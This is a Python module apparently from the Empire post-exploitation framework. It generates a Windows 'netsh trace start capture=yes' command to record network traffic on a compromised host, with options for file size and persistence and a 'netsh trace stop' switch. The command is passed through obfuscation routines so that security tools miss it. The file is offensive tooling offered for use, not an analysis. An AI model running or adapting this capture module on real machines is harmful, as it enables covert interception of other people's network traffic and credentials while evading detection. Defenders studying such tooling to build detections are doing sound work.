from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        max_size = params['MaxSize']
        trace_file = params['TraceFile']
        persistent = params['Persistent']
        stop_trace = params['StopTrace']

        if stop_trace.lower() == "true":
            script = "netsh trace stop"

        else:
            script = "netsh trace start capture=yes traceFile=%s" %(trace_file)

            if max_size != "":
                script += " maxSize=%s" %(max_size)

            if persistent != "":
                script += " persistent=yes"
        # Get the random function name generated at install and patch the stager with the proper function name
        if obfuscate:
            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
        script = data_util.keyword_obfuscation(script)

        return script
